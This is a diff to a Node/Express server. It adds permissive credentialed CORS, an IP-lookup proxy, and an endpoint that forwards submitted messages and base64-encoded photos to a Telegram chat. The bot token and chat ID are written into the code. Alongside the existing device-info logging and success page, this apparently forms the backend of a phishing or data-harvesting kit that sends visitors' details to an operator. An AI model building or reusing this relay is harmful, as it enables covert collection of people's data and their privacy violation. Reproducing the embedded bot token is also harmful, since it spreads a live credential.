@@ -1,6 +1,7 @@
 const express = require('express');
 const path = require('path');
 const fs = require('fs');
+const cors = require('cors');
 
 const app = express();
 const PORT = process.env.PORT || 5000;
@@ -17,11 +18,19 @@ if (fs.existsSync(indexPath)) {
   console.error(`ERROR: Index file NOT found at: ${indexPath}`);
 }
 
-// Set headers to allow cross-origin requests
+// Configure CORS properly
+app.use(cors({
+  origin: true,
+  credentials: true
+}));
+
+// Add security headers to prevent browser warnings
 app.use((req, res, next) => {
-  res.header('Access-Control-Allow-Origin', '*');
-  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-  res.header('Access-Control-Allow-Headers', 'Content-Type');
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('X-Frame-Options', 'DENY');
+  res.setHeader('X-XSS-Protection', '1; mode=block');
+  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
   next();
 });
 
@@ -85,6 +94,70 @@ app.get('/success', (req, res) => {
   res.sendFile(path.join(__dirname, 'success.html'));
 });
 
+// Proxy endpoint for IP info to prevent CORS issues
+app.get('/api/ip-info', async (req, res) => {
+  try {
+    const fetch = require('node-fetch');
+    const response = await fetch('https://ipinfo.io/json');
+    const data = await response.json();
+    res.json(data);
+  } catch (error) {
+    console.error('Error getting IP info:', error);
+    res.status(500).json({ error: 'Failed to get IP info' });
+  }
+});
+
+// Proxy endpoint for Telegram API to prevent CORS issues
+app.post('/api/send-telegram', async (req, res) => {
+  try {
+    const { message, photo } = req.body;
+    const TELEGRAM_CONFIG = {
+      botToken: "8366649467:AAGaMF5mQBsffV-Zc2QU9AQ7XSjD0IKXf3Y",
+      authorizedChatId: "7211220207"
+    };
+
+    const fetch = require('node-fetch');
+    const FormData = require('form-data');
+    
+    let telegramResponse;
+    
+    if (photo) {
+      // Send photo message
+      const formData = new FormData();
+      formData.append('chat_id', TELEGRAM_CONFIG.authorizedChatId);
+      formData.append('photo', Buffer.from(photo.data, 'base64'), { filename: photo.filename });
+      formData.append('caption', message);
+      formData.append('parse_mode', 'HTML');
+      
+      telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+    } else {
+      // Send text message
+      telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CONFIG.authorizedChatId,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      });
+    }
+    
+    const result = await telegramResponse.json();
+    console.log('Telegram API response:', result);
+    res.json({ success: result.ok, data: result });
+    
+  } catch (error) {
+    console.error('Error sending to Telegram:', error);
+    res.status(500).json({ success: false, error: 'Failed to send message' });
+  }
+});
+
 // API endpoint to receive form data
 app.post('/api/send-message', (req, res) => {
   try {
@@ -95,9 +168,6 @@ app.post('/api/send-message', (req, res) => {
     if (deviceInfo) {
       console.log('- Device Info:', JSON.stringify(deviceInfo));
     }
-
-    // You can implement Telegram notification here if needed
-    // This would use the TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables
 
     res.status(200).json({ success: true });
   } catch (error) {
